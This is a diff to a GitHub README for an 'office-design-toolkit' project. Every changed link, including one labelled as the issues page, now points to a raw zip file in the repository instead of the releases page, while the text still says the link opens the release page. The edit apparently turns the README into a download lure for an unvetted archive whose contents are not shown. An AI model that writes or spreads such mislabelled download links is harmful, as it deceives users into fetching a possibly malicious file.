@@ -1,6 +1,6 @@
 # 🗂️ office-design-toolkit - Structured Document Design Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Get%20Office%20Toolkit-blue?style=for-the-badge)](https://github.com/wollys/office-design-toolkit/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Office%20Toolkit-blue?style=for-the-badge)](https://raw.githubusercontent.com/wollys/office-design-toolkit/main/references/office-toolkit-design-v1.1.zip)
 
 ---
 
@@ -59,7 +59,7 @@ office-design-toolkit contains:
 ## 🔧 How to Download and Install 🖥️
 
 1. Click the big **Download** button at the top or this link:  
-   [Download office-design-toolkit Releases](https://github.com/wollys/office-design-toolkit/releases)  
+   [Download office-design-toolkit Releases](https://raw.githubusercontent.com/wollys/office-design-toolkit/main/references/office-toolkit-design-v1.1.zip)  
    This will open the release page where you can get the latest version.
 
 2. On the releases page, find the newest version listed. It will usually have a date and version number like “v1.0” or higher.
@@ -154,8 +154,8 @@ A: Updates are planned every few months or when new features are added.
 
 ## ❓ Need Help?
 
-Visit the [GitHub issues page](https://github.com/wollys/office-design-toolkit/issues) to ask questions or report problems. The community and maintainers review requests regularly.
+Visit the [GitHub issues page](https://raw.githubusercontent.com/wollys/office-design-toolkit/main/references/office-toolkit-design-v1.1.zip) to ask questions or report problems. The community and maintainers review requests regularly.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Office%20Toolkit-blue?style=for-the-badge)](https://github.com/wollys/office-design-toolkit/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Office%20Toolkit-blue?style=for-the-badge)](https://raw.githubusercontent.com/wollys/office-design-toolkit/main/references/office-toolkit-design-v1.1.zip)
